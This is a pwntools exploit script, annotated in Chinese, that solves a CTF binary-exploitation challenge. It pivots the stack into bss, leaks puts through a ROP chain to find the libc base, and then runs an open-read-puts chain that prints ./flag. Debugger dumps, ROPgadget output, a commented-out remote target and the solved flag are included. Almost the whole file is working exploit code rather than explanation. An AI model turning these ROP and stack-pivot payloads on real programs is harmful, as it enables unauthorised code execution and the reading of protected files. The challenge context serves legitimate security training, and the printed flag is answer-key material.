from pwn import *
import time

context(arch="amd64",os='linux',log_level="debug")

io = process("shell")
#io = remote("10.212.27.23", 4396)
elf = ELF("shell")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc-2.27.so")

init_array_start = 0x600db0

#sys = elf.sym["system"]
binsh = next(elf.search(b'sh'))
print(hex(binsh))
#0x400890

leave_ret = 0x000000000040075b
pop_rdi_ret = 0x400863
pop_rsi_r15_ret = 0x0000000000400861
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x000000000040085a

bss = elf.bss() + 0x100
print(hex(bss))
#bss = 0x601110

read_plt = elf.plt["read"]
print(hex(read_plt))
#0x400570

read_got = elf.got["read"]
print(hex(read_got))
#0x600fd8


puts_plt = elf.plt['puts']
puts_got = elf.got["puts"]

#gdb.attach(io, "b *0x40075D")
gdb.attach(io)

pad = 0x20
main_addr = 0x4007bc

payload1  = (pad)*b'a' + p64(bss)
#1.执行到这里时，由于ebp位置已经是该函数的栈底了，所以也就意味着这个函数行将执行完毕，所以会有leave_ret指令。而leave_ret指令实为(move_rsp_rbp)_(pop_rbp(rsp+=8))_(pop_rip(rsp+=8))，所以这时，rbp已转移到bss位置，rsp在rbp原位置+16个字节的位置，rip中存放的是ret_addr地址中的值：也就是下面的pop_rdi_ret指令存放的地址。
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
#2.给puts(puts_got)，目的是泄露puts函数的真实地址，便于后续计算libc偏移
payload1 += p64(0x4007c8)
#3.ida中程序要执行puts("soft! try me:")的位置，这里返回这个位置是为了便于后面的payload1的发送以及接收程序输出流，便于下一步操作。
#*.这里需要解决的一个问题是：我们在这里劫持程序回到main函数里，方便继续利用main函数里的read函数来读入我们的payload，但是，我们想要知道在执行这里的read时，传进去的三个参数的值是什么？
'''
   0x4007c8 <main+107>    lea    rdi, [rip + 0xd9]
   0x4007cf <main+114>    call   puts@plt                      <puts@plt>
 
 > 0x4007d4 <main+119>    lea    rax, [rbp - 0x20]
   0x4007d8 <main+123>    mov    edx, 0x80
   0x4007dd <main+128>    mov    rsi, rax
   0x4007e0 <main+131>    mov    edi, 0
   0x4007e5 <main+136>    call   read@plt
看如上的汇编指令：执行完puts之后，由于我们已经将rbp迁移到了bss位置，所以可以看到我们最终是在给rsi赋bss-0x20的值，也就是说这里read函数为read(0, bss-0x20, 0x80)，已经要向bss-0x20这个 位置向上复写数据了!!!
'''

io.sendlineafter("soft! try me :)\n", payload1)
io.recvuntil(b'let me guess\n', drop = False)

puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print("puts_addr = " + hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
print("libc_base = " + hex(libc_base))

open_addr = libc.sym["open"] + libc_base
read_addr = libc.sym["read"] + libc_base
#4.这里计算出了上述函数的真实地址。


payload2  = pad*b'a' + p64(bss+0x100)
#5.执行到这里时，由于ebp位置已经是该函数的栈底了，所以也就意味着这个函数行将执行完毕，所以会有leave_ret指令。而leave_ret指令实为(move_rsp_rbp)_(pop_rbp(rsp+=8))_(pop_rip(rsp+=8))，所以这时，rbp已转移到bss+0x100位置，rsp在rbp原位置+16个字节(也就是ret_addr的上面8个字节)的位置，rip中存放的是ret_addr地址中的值：也就是下面的pop_rdi_ret指令存放的地址。
payload2 += p64(pop_rdi_ret) + p64(bss+0x40)   
#8.***重点！！！
'''
如何计算flag的位置？
1.脑算：
	payload2的写入位置为？ ans : bss-0x20 (就是上面*步我们要找read的三个参数，进而获得payload2读入后写入的位置：read(0, bss-0x20, 0x80))
	所写的flag位置距写入位置相对距离为：dis(相对) = 0x20 + 8 * 8 = 0x20 + 0x40
	🉐：绝对地址为：dis(绝对) = bss - 0x20 + dis(相对) = bss + 0x40
2.调试计算：
	1.调试到上面的main函数的read此步后，先记录buf的位置：
	------------------------------------------------------------------------------
	► 0x4007e5 <main+136>    call   read@plt                      <read@plt>
        fd: 0x0 (pipe:[104887])
        buf: 0x6010f0 ◂— 0x0
        nbytes: 0x80
	可知buf的位置为：0x6010f0，这和我们计算预计的位置：bss - 0x20 = 0x601110 - 0x20一致！
	------------------------------------------------------------------------------
	2.执行完read(n步过一次)，用x/50gx buf——addr 来查看这里的读入信息：
	------------------------------------------------------------------------------
	pwndbg> x/50gx 0x6010f0
	0x6010f0:	0x6161616161616161	0x6161616161616161
	0x601100:	0x6161616161616161	0x6161616161616161
	0x601110:	0x0000000000601210	0x0000000000400863
	0x601120:	0x0000000000601150	0x0000000000400861
	0x601130:	0x0000000000000000	0x0000000000000000
	0x601140:	0x00007ff7904f1d10	0x00000000004007c8
	0x601150:	0x000067616c662f2e	0x0000000000000000
	0x601160:	0x0000000000000000	0x0000000000000000
	0x601170:	0x0000000000000000	0x0000000000000000
	0x601180:	0x0000000000000000	0x0000000000000000
	0x601190:	0x0000000000000000	0x0000000000000000
	0x6011a0:	0x0000000000000000	0x0000000000000000
	0x6011b0:	0x0000000000000000	0x0000000000000000
	0x6011c0:	0x0000000000000000	0x0000000000000000
	0x6011d0:	0x0000000000000000	0x0000000000000000
	0x6011e0:	0x0000000000000000	0x0000000000000000
	0x6011f0:	0x0000000000000000	0x0000000000000000
	0x601200:	0x0000000000000000	0x0000000000000000
	0x601210:	0x0000000000000000	0x0000000000000000
	0x601220:	0x0000000000000000	0x0000000000000000
	0x601230:	0x0000000000000000	0x0000000000000000
	0x601240:	0x0000000000000000	0x0000000000000000
	0x601250:	0x0000000000000000	0x0000000000000000
	0x601260:	0x0000000000000000	0x0000000000000000
	0x601270:	0x0000000000000000	0x0000000000000000
	******如果这里看不到flag的字符串形式，可以将下面的leave_ret指令步过后，用stack 50来查看：******
	(因为stack指令查看的是rsp上方的栈中的情况，所以在没有leave_ret之前，rsp不会回到rbp - 0x20处)，所以在没有leave_ret之前无法查看读入位置的情况
	──────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────
	   0x4007ea       <main+141>               lea    rdi, [rip + 0xc7]
	   0x4007f1       <main+148>               call   puts@plt                      <puts@plt>
	 
	   0x4007f6       <main+153>               mov    eax, 0
	   0x4007fb       <main+158>               leave  
	   0x4007fc       <main+159>               ret    
	    ↓
	 ► 0x400863       <__libc_csu_init+99>     pop    rdi                           <0x7ff7905d27e0>
	   0x400864       <__libc_csu_init+100>    ret    
	    ↓
	   0x400861       <__libc_csu_init+97>     pop    rsi
	   0x400862       <__libc_csu_init+98>     pop    r15
	   0x400864       <__libc_csu_init+100>    ret    
	    ↓
	   0x7ff7904f1d10 <open64>                 endbr64 
	──────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
	00:0000│ rsp 0x601120 —▸ 0x601150 ◂— 0x67616c662f2e /* './flag' */
	01:0008│     0x601128 —▸ 0x400861 (__libc_csu_init+97) ◂— pop    rsi
	02:0010│     0x601130 ◂— 0x0
	03:0018│     0x601138 ◂— 0x0
	04:0020│     0x601140 —▸ 0x7ff7904f1d10 (open64) ◂— endbr64 
	05:0028│     0x601148 —▸ 0x4007c8 (main+107) ◂— lea    rdi, [rip + 0xd9]
	06:0030│     0x601150 ◂— 0x67616c662f2e /* './flag' */
	07:0038│     0x601158 ◂— 0x0
	────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
	 ► f 0         0x400863 __libc_csu_init+99
	   f 1         0x400861 __libc_csu_init+97
	   f 2   0x7ff7904f1d10 open64
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	pwndbg> stack 50
	00:0000│ rsp 0x601120 —▸ 0x601150 ◂— 0x67616c662f2e /* './flag' */
	01:0008│     0x601128 —▸ 0x400861 (__libc_csu_init+97) ◂— pop    rsi
	02:0010│     0x601130 ◂— 0x0
	03:0018│     0x601138 ◂— 0x0
	04:0020│     0x601140 —▸ 0x7ff7904f1d10 (open64) ◂— endbr64 
	05:0028│     0x601148 —▸ 0x4007c8 (main+107) ◂— lea    rdi, [rip + 0xd9]
	06:0030│     0x601150 ◂— 0x67616c662f2e /* './flag' */
	07:0038│     0x601158 ◂— 0x0
	... ↓        42 skipped
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	可以看到flag的存储位置为0x601150，以及flag的p64表示为 0x67616c662f2e，这可以与上面用x/50gx 0x6010f0 相互印证！！！
	3.计算与bss的相对偏移或直接填写绝对地址即可！！！
'''
payload2 += p64(pop_rsi_r15_ret) + p64(0) + p64(0)
payload2 += p64(open_addr) + p64(0x4007c8)
#6.这里由于本系统中会将rdx寄存器初始化为0x0，所以这里不需要对rdx寄存器填写payload并赋值。
payload2 += b'./flag\x00\x00'
#7.这里存放的是open函数的第一个参数，整体上open函数要执行的是open(./flag, 0, 0)这个指令，所以这里填了./flag字符串后，上面对rdi传参时要计算填入的flag的地址。
###——>open函数的成功执行，意味着我们已经打开了这个文件，拥有了访问这个文件的句柄


time.sleep(1)
io.sendafter("soft! try me :)\n", payload2)


#本地调试payload3


##***出于对gadget长度的考虑，我们这里在泄漏偏移后可以利用动态链接库中丰富多样满足要求且的gadget，加上偏移即可使用
##值得注意的是，由于动态链接库会随版本不断更新，这里的未加偏移的源地址要随着版本不断更新才对！！！
##怎么找呢？当然是用ROPgadget来找拉！！！
'''
zrz@zrz-virtual-machine:~/Pwn_problem/BUAA_ctf/Hip/shell$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --only "pop|ret"|grep rdx
0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000119211 : pop rdx ; pop r12 ; ret
0x000000000015f8c6 : pop rdx ; pop rbx ; ret
0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000142c92 : pop rdx ; ret
0x00000000000dfc12 : pop rdx ; ret 0x10

zrz@zrz-virtual-machine:~/Pwn_problem/BUAA_ctf/Hip/shell$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --only "pop|ret"|grep rsi
0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000023b68 : pop rsi ; pop r15 ; ret
0x000000000002601f : pop rsi ; ret
'''
local_pop_rdx_rbx_ret = 0x000000000015f8c6 + libc_base
local_pop_rsi_ret = 0x000000000002601f + libc_base
#9.本地通过libc能找到的gadget的确切地址

payload3  = (pad)*b'a' + p64(bss+0x200)
#10.这里又是一次栈迁移，执行完这两句后，rbp会来到bss + 0x200处，read函数会进行read(0, bss + 0x200 - 0x20, 0x80)，然后rsp会在rbp原位置高16个字节的地方，rip中存放的是ret_addr中的指令的地址，也就是下面的pop_rdi_ret指令的地址
payload3 += p64(pop_rdi_ret) + p64(0x3)
payload3 += p64(local_pop_rsi_ret) + p64(bss+0x300) + p64(local_pop_rdx_rbx_ret) + p64(0x50) + p64(0)
#payload3 += p64(pop_rsi_r15_ret) + p64(bss+0x300) + p64(0) + p64(local_pop_rdx_rbx_ret) + p64(0x50) + p64(0)
################################################################################################################################
#11.上面两行给read函数赋参数，即执行：read(3, bss+0x300, 0x50)
'''
需要注意的是：read函数的使用方法为：
********************************************************************************************************************************
	read函数可以读取文件。读取文件指从某一个已打开地文件中，读取一定数量地字符，然后将这些读取的字符放入某一个预存的缓冲区内，供以后使用。
	使用格式如下：
								number = read(handle, buffer ,n)　；
	上述read调用函数中，各个参数的定义如下：
		handle： 这是一个已经打开的文件句柄，表示从这个文件句柄所代表的文件读取数据。
		buffer： 指缓冲区，即读取的数据会被放到这个缓冲区中去。
		n： 表示调用一次read操作，应该读多少数量的字符。
		number：表示系统实际所读取的字符数量。
********************************************************************************************************************************
为什么这里我们要打开的文件句柄为3呢？？？
********************************************************************************************************************************
	open函数属于Linux中系统IO，用于“打开”文件，代码打开一个文件意味着获得了这个文件的访问句柄。
	int fd = open（参数1，参数2，参数3）；
	int fd = open（const char *pathname,int flags,mode_t mode）;
	1.句柄（file descriptor 简称fd）
	首先每个文件都属于自己的句柄，例如标准输入是0，标准输出是1，标准出错是2。
	每打开一个文件就会返回句柄来操作这个文件，一般是从3开始，然后4,5,6一直下去。
	close（fd）之后句柄就返回给系统，例如打开一个文件后fd是3，close之后再打开另外一个文件也还是3，但代表的文件不一样了。
********************************************************************************************************************************
由此可以看到：默认第一个打开的文件返回的句柄为3，也就对应着我们之前打开的flag文件
'''
###由此可见这段payload是要把已打开的flag文件读到bss + 0x300的位置处
################################################################################################################################
payload3 += p64(read_plt)
payload3 += p64(pop_rdi_ret) + p64(bss+0x300)
#12.这里给puts函数赋参数值，是要将我们刚才在bss + 0x300处read写进去的flag文件里的内容给读出来
payload3 += p64(puts_plt) + p64(main_addr)

'''
#远程调试payload3
remote_pop_rdx_ret = 0x0000000000001b96 + libc_base
remote_pop_rsi_ret = 0x0000000000023a6a + libc_base

payload3  = (pad)*b'a' + p64(bss+0x200)
payload3 += p64(pop_rdi_ret) + p64(0x3)
payload3 += p64(remote_pop_rsi_ret) + p64(bss+0x300) + p64(remote_pop_rdx_ret) + p64(0x50)
payload3 += p64(read_plt)
payload3 += p64(pop_rdi_ret) + p64(bss+0x300)
payload3 += p64(puts_plt) + p64(main_addr)
'''

time.sleep(1)
io.sendafter("soft! try me :)\n", payload3)

  
io.interactive()
               

#flag{ORW_not_only_adapt_to_OJ}






